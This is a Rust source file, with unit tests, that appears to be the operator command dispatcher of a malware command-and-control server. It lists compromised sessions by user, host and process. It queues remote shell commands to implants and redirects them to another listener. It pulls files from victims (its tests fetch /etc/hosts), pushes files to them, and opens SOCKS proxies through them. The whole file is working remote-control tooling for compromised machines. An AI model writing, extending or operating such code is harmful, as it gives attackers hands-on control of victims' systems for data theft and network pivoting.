use std::sync::RwLock;

use uuid::Uuid;

use crate::queue::SharedQueue;
use crate::session::SharedRegistry;
use crate::uploadstore::UploadStore;

/// Result of parsing one operator command line.
#[derive(Debug, Clone)]
pub enum Outcome {
    /// A remote task was queued for the session.
    TaskQueued {
        session: Uuid,
        task_id: Uuid,
    },
    /// A local action was executed (no implant round trip).
    Local {
        message: String,
    },
    Error(String),
}

/// Central command layer so the console stays a thin front-end. Holds the
/// operator's currently-interacted session.
pub struct Dispatcher {
    pub registry: SharedRegistry,
    pub queue: SharedQueue,
    pub uploads: UploadStore,
    interacted: RwLock<Option<Uuid>>,
}

impl Dispatcher {
    pub fn new(registry: SharedRegistry, queue: SharedQueue, uploads: UploadStore) -> Self {
        Dispatcher {
            registry,
            queue,
            uploads,
            interacted: RwLock::new(None),
        }
    }

    pub fn set_interacted(&self, id: Option<Uuid>) {
        *self.interacted.write().unwrap() = id;
    }

    pub fn interacted(&self) -> Option<Uuid> {
        *self.interacted.read().unwrap()
    }

    pub fn parse(&self, line: &str) -> Outcome {
        let mut parts = line.split_whitespace();
        let cmd = parts.next().unwrap_or("");
        let args: Vec<String> = parts.map(|s| s.to_string()).collect();
        let interacted = self.interacted();
        match cmd {
            "sessions" => {
                let s = self.registry.list();
                if s.is_empty() {
                    Outcome::Local {
                        message: "no sessions".into(),
                    }
                } else {
                    let body = s
                        .iter()
                        .map(|x| {
                            format!(
                                "{}  {}@{}  {} {}  pid={}",
                                x.id, x.username, x.hostname, x.os, x.arch, x.pid
                            )
                        })
                        .collect::<Vec<_>>()
                        .join("\n");
                    Outcome::Local { message: body }
                }
            }
            "interact" => {
                let Some(id) = args.first().and_then(|a| Uuid::parse_str(a).ok()) else {
                    return Outcome::Error("usage: interact <session-id>".into());
                };
                if self.registry.get(&id).is_some() {
                    self.set_interacted(Some(id));
                    Outcome::Local {
                        message: format!("now interacting with {}", id),
                    }
                } else {
                    Outcome::Error(format!("no session {}", id))
                }
            }
            "kill" => {
                let Some(id) = args.first().and_then(|a| Uuid::parse_str(a).ok()) else {
                    return Outcome::Error("usage: kill <session-id>".into());
                };
                match self.registry.remove(&id) {
                    true => Outcome::Local {
                        message: format!("killed {}", id),
                    },
                    false => Outcome::Error(format!("no session {}", id)),
                }
            }
            "shell" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                if args.is_empty() {
                    return Outcome::Error("usage: shell <command> [args...]".into());
                }
                let command = args[0].clone();
                let rest = args[1..].to_vec();
                let timeout_ms = 30_000;
                match self.queue.push(&sid, command, rest, timeout_ms) {
                    Ok(task_id) => Outcome::TaskQueued {
                        session: sid,
                        task_id,
                    },
                    Err(e) => Outcome::Error(e.to_string()),
                }
            }
            "redirect" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                if args.len() != 1 {
                    return Outcome::Error("usage: redirect <host>".into());
                }
                match self
                    .queue
                    .push(&sid, "nw/sethost".into(), vec![args[0].clone()], 30_000)
                {
                    Ok(task_id) => Outcome::TaskQueued {
                        session: sid,
                        task_id,
                    },
                    Err(e) => Outcome::Error(e.to_string()),
                }
            }
            "download" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                if args.len() != 1 {
                    return Outcome::Error("usage: download <remote-path>".into());
                }
                match self
                    .queue
                    .push(&sid, "nw/download".into(), vec![args[0].clone()], 60_000)
                {
                    Ok(task_id) => Outcome::TaskQueued {
                        session: sid,
                        task_id,
                    },
                    Err(e) => Outcome::Error(e.to_string()),
                }
            }
            "upload" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                let [local, dest] = args.as_slice() else {
                    return Outcome::Error("usage: upload <local-path> <remote-dest>".into());
                };
                if let Err(e) = self.uploads.start(&sid, local.into(), dest.clone()) {
                    return Outcome::Error(e);
                }
                // Queue the task that opens the destination on the agent; the job
                // is already registered so the agent's next poll starts receiving.
                match self
                    .queue
                    .push(&sid, "nw/upload".into(), vec![dest.clone()], 60_000)
                {
                    Ok(task_id) => Outcome::TaskQueued {
                        session: sid,
                        task_id,
                    },
                    Err(e) => Outcome::Error(e.to_string()),
                }
            }
            "socks" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                if args.len() != 1 {
                    return Outcome::Error("usage: socks <port>".into());
                }
                match self.queue.push(&sid, "nw/socks".into(), args, 10_000) {
                    Ok(task_id) => Outcome::TaskQueued {
                        session: sid,
                        task_id,
                    },
                    Err(e) => Outcome::Error(e.to_string()),
                }
            }
            "jobs" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                let list = self.queue.statuses(&sid);
                if list.is_empty() {
                    return Outcome::Local {
                        message: "no tasks yet".into(),
                    };
                }
                let body = list
                    .iter()
                    .map(|(cmd, st)| format!("{:?}\t{}", st, cmd))
                    .collect::<Vec<_>>()
                    .join("\n");
                Outcome::Local { message: body }
            }
            "" => Outcome::Local {
                message: String::new(),
            },
            other => Outcome::Error(format!("unknown command: {}", other)),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::queue::TaskQueue;
    use crate::session::SessionRegistry;
    use std::sync::Arc;

    fn disp() -> (Dispatcher, Uuid) {
        let reg = Arc::new(SessionRegistry::new());
        let q = Arc::new(TaskQueue::new());
        let sid = reg.create(
            "h".into(),
            "u".into(),
            "nix".into(),
            "x".into(),
            1,
            "ip".into(),
            [7u8; 32],
        );
        (Dispatcher::new(reg, q, UploadStore::default()), sid)
    }

    #[test]
    fn sessions_lists_one() {
        let (d, _) = disp();
        match d.parse("sessions") {
            Outcome::Local { message } => assert!(message.contains('@')),
            _ => panic!("expected Local"),
        }
    }

    #[test]
    fn shell_requires_interaction() {
        let (d, _) = disp();
        assert!(matches!(d.parse("shell echo hi"), Outcome::Error(_)));
    }

    #[test]
    fn interact_then_shell_queues() {
        let (d, sid) = disp();
        assert!(matches!(
            d.parse(&format!("interact {}", sid)),
            Outcome::Local { .. }
        ));
        match d.parse("shell echo hi") {
            Outcome::TaskQueued { session, .. } => assert_eq!(session, sid),
            other => panic!("expected TaskQueued, got {:?}", other),
        }
    }

    #[test]
    fn redirect_queues_sethost_task() {
        let (d, sid) = disp();
        assert!(matches!(
            d.parse(&format!("interact {}", sid)),
            Outcome::Local { .. }
        ));

        let task_id = match d.parse("redirect http://second-listener:8081") {
            Outcome::TaskQueued { session, task_id } => {
                assert_eq!(session, sid);
                task_id
            }
            other => panic!("expected TaskQueued, got {:?}", other),
        };
        let queued = d.queue.drain(&sid);
        assert_eq!(queued.len(), 1);
        assert_eq!(queued[0].id, task_id);
        assert_eq!(queued[0].command, "nw/sethost");
        assert_eq!(queued[0].args, ["http://second-listener:8081"]);
        assert_eq!(queued[0].timeout_ms, 30_000);
    }

    #[test]
    fn download_queues_nw_download_task() {
        let (d, sid) = disp();
        assert!(matches!(
            d.parse(&format!("interact {}", sid)),
            Outcome::Local { .. }
        ));
        let task_id = match d.parse("download /etc/hosts") {
            Outcome::TaskQueued { session, task_id } => {
                assert_eq!(session, sid);
                task_id
            }
            other => panic!("expected TaskQueued, got {:?}", other),
        };
        let queued = d.queue.drain(&sid);
        assert_eq!(queued[0].id, task_id);
        assert_eq!(queued[0].command, "nw/download");
        assert_eq!(queued[0].args, ["/etc/hosts"]);
    }

    #[test]
    fn redirect_requires_one_host_for_an_active_session() {
        let (d, sid) = disp();
        assert!(matches!(
            d.parse("redirect http://second-listener:8081"),
            Outcome::Error(_)
        ));
        assert!(matches!(
            d.parse(&format!("interact {}", sid)),
            Outcome::Local { .. }
        ));
        assert!(matches!(d.parse("redirect"), Outcome::Error(_)));
        assert!(matches!(
            d.parse("redirect http://one http://two"),
            Outcome::Error(_)
        ));
        assert!(d.registry.remove(&sid));
        assert!(matches!(
            d.parse("redirect http://second-listener:8081"),
            Outcome::Error(_)
        ));
    }

    #[test]
    fn kill_removes_session() {
        let (d, sid) = disp();
        let mut found_local = false;
        if let Outcome::Local { message } = d.parse(&format!("kill {}", sid)) {
            assert!(message.contains("killed"));
            found_local = true;
        }
        assert!(found_local);
        assert!(
            matches!(d.parse("sessions"), Outcome::Local { message } if message == "no sessions")
        );
    }
}
